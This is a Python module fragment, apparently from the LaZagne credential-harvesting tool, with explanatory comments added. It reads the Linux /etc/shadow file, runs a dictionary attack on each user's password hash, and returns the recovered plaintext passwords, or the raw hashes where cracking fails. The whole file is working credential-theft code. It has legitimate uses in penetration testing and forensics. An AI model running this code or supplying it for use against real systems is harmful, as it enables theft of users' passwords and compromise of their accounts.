#!/usr/bin/env python
# -*- coding: utf-8 -*-
import crypt
import os

# Import necessary modules
from lazagne.config.module_info import ModuleInfo
from lazagne.config.dico import get_dic

def run(self):
    # Path to the shadow file where user credentials are stored
    shadow_file = '/etc/shadow'

    # Check if the current user has read access to the shadow file
    if os.access(shadow_file, os.R_OK):
        pwd_found = []  # List to store results of found passwords

        # Open the shadow file to read user details and hashed passwords
        with open(shadow_file, 'r') as shadow_file:
            # Loop through each line in the shadow file
            for line in shadow_file.readlines():
                # Remove newline characters and split the line by ':' to separate user data
                user_hash = line.replace('\n', '')
                line = user_hash.split(':')

                # Check if the password field is valid (not empty or special markers like 'x', '*', '!', '!!')
                if not line[1] in ['x', '*', '!', '!!']:
                    user = line[0]  # Extract the username
                    crypt_pwd = line[1]  # Extract the hashed password

                    # Try dictionary attack on the hashed password to find a match
                    result = self.dictionary_attack(user, crypt_pwd)
                    if result:
                        # If a password is found, add it to the list with the username and found password
                        pwd_found.append(result)
                    else:
                        # If no password is found, save the hash instead
                        pwd_found.append({
                            'username': user_hash.split(':')[0].replace('\n', ''),  # Extract the username
                            'Password': ':'.join(user_hash.split(':')[1:]),  # Save the hash in its entirety
                        })

        # Return the list of found passwords or hashes
        return pwd_found
